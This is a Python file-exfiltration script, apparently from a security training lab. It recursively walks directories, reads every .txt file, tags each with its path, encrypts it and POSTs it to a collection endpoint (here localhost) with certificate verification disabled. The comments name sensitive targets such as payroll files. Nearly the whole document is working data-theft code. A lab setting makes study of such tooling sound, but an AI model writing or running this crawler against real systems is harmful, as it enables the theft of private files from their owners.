#Create this file. It uses os.walk to visit every room in the house, not just the hallway.
import requests
import os
from cryptor import encrypt


def recursive_hunt(start_dir="."):
    url = "https://127.0.0.1:4433/auto_sync"

    print(f"[*] Crawler started in: {os.path.abspath(start_dir)}")

    # os.walk yields a 3-tuple: (current_path, directories_inside, files_inside)
    for root, dirs, files in os.walk(start_dir):
        for filename in files:
            # We only want .txt files for this lab
            if filename.endswith(".txt") and filename != "loot.txt":

                # Construct the full path (e.g., ./internal_server/finance/payroll/ceo.txt)
                full_path = os.path.join(root, filename)

                print(f"[*] Deep Target acquired: {full_path}")

                # Read and Encrypt
                try:
                    with open(full_path, "rb") as f:
                        content = f.read()

                    # Tag the data with the filename so we know where it came from
                    labeled_data = f"PATH: {full_path}\nDATA:\n".encode() + content

                    encrypted_payload = encrypt(labeled_data).decode()

                    # Exfiltrate
                    requests.packages.urllib3.disable_warnings()
                    requests.post(url, data=encrypted_payload, verify=False)
                    print(f"[+] Exfiltrated!")

                except Exception as e:
                    print(f"[!] Skipped {full_path}: {e}")


if __name__ == '__main__':
    # Start searching from the current folder downward
    recursive_hunt(".")
